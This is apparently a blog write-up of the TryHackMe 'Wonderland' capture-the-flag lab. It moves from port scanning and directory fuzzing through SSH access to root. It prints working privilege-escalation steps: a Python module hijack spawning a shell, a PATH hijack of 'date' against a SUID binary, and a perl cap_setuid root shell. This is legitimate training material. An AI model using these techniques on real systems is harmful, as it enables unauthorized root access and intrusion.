---
title: "Wonderland"
date: 2022-10-24T16:00:10+01:00
draft: false
categories:
  - TryHackMe
---

{{< image src="/thm/wonderland/alice.jpeg" alt="alice" position="left" style="width: 200px;" >}}

Alice in wonderland...weirdest book I ever read as a kid and even more as an adult

Let's follow the rabbit

## Enumeration

### rustscan + nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### ffuf

```
                        [Status: 200, Size: 402, Words: 55, Lines: 10]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1]
index.html              [Status: 301, Size: 0, Words: 1, Lines: 1]
r                       [Status: 301, Size: 0, Words: 1, Lines: 1]
```
"r" like rabbit...I see where it's going and I do not like it

I did not have the patience to fuzz all that (I think I should) but hey its r/a/b/b/i/t

aaaaand I hit the wall...now what?

it says "open the door" and gives us directions that feel too much like a dead end

I check the source (always) and find interresting credentials

`alice:fake_password_cause_it_wont_be_easy`

as SSH is open you know what to do

## Exploitation

```
alice@wonderland:~$ ls -al
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py

```

Lol...you obviously cannot read it

```
alice@wonderland:~$ cat /root/user.txt
thm{flag_for_wonderland_population}
```
classic trickery

```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

I deduce from that we have to pivot to rabbit user using that python script

```
alice@wonderland:~$ cat  walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,

...


for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```



that was a bit technical and needed some "searching"

This was also the best part for me. You can actually hijack the path that python library due to the `import random`


```
alice@wonderland:~$ ls
random.py  root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat random.py
import os
os.system("/bin/bash")

```

python will check the script folder before its own libraries folder, which is funny

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
[sudo] password for alice: 
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

Finally! we caught that rabbit! still not root though

## Privilege escalation

The rabbit got a SUID binary in his home folder

```
rabbit@wonderland:/home/rabbit$ ls -al
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty

rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sun, 23 Oct 2022 19:46:28 +0000
Ask very nicely, and I will give you some tea while you wait for him
tea please
Segmentation fault (core dumped)

```
Interresting behaviour...binary analysis it is

```
rabbit@wonderland:/home/rabbit$ which r2
rabbit@wonderland:/home/rabbit$ which gdb
```
[How can I work in these conditions?](/thm/wonderland/teaParty)


```
rabbit@wonderland:/home/rabbit$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.8.4.19 - - [23/Oct/2022 18:54:55] "GET /teaParty HTTP/1.1" 200 -
```

```
└──╼ $wget http://10.10.190.164:8080/teaParty
--2022-10-23 19:54:39--  http://10.10.190.164:8080/teaParty
Connexion à 10.10.190.164:8080… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 16816 (16K) [application/octet-stream]
Sauvegarde en : « teaParty »

teaParty                                                   100%[========================================================================================================================================>]  16,42K  2,08KB/s    ds 7,9s    

2022-10-23 19:54:49 (2,08 KB/s) — « teaParty » sauvegardé [16816/16816]

```
```
│           0x55795772918d      488d3d740e00.  lea rdi, str.Welcome_to_the_tea_party__nThe_Mad_Hatter_will_be_here_soon. ; 0x55795772a008 ; "Welcome to the tea party!\nThe Mad Hatter will be here soon."
│           0x557957729194      e897feffff     call sym.imp.puts       ; int puts(const char *s)
│           0x557957729199      488d3da80e00.  lea rdi, str._bin_echo__n_Probably_by___date___datenext_hour__R ; 0x55795772a048 ; "/bin/echo -n 'Probably by ' && date --date='next hour' -R"
│           0x5579577291a0      e89bfeffff     call sym.imp.system     ; int system(const char *string)
│           0x5579577291a5      488d3ddc0e00.  lea rdi, str.Ask_very_nicely__and_I_will_give_you_some_tea_while_you_wait_for_him ; 0x55795772a088 ; "Ask very nicely, and I will give you some tea while you wait for him"
│           0x5579577291ac      e87ffeffff     call sym.imp.puts       ; int puts(const char *s)
│           0x5579577291b1      e89afeffff     call sym.imp.getchar    ; int getchar(void)
│           0x5579577291b6      488d3d130f00.  lea rdi, str.Segmentation_fault__core_dumped_ ; 0x55795772a0d0 ; "Segmentation fault (core dumped)"
```
Basically the interresting part is ` "/bin/echo -n 'Probably by ' && date --date='next hour' -R"`. the `date` library path can also be hijacked just like we did in python

Also faking a segfault...that's so evil I should note it down! who even do that??

```
rabbit@wonderland:/home/rabbit$ echo "/bin/bash" > date
rabbit@wonderland:/home/rabbit$ chmod 777 date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```
Oh look he came! (lol)

```
hatter@wonderland:/home/rabbit$ cd /home/hatter
hatter@wonderland:/home/hatter$ ls -al
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ cat password.txt
password_for_sane_people
```
Yeah! more enumeration...MORE!!

```
hatter@wonderland:~$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

perl? okay let's ask gtfobins

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

it said yes

```
# cd /home/alice
# ls
random.py  root.txt  walrus_and_the_carpenter.py
# cat root.txt
thm{the_shech_sheshire_cheshirre_that_fat_cat_is_creepy}
```

Weirdest CTF of my whole life!
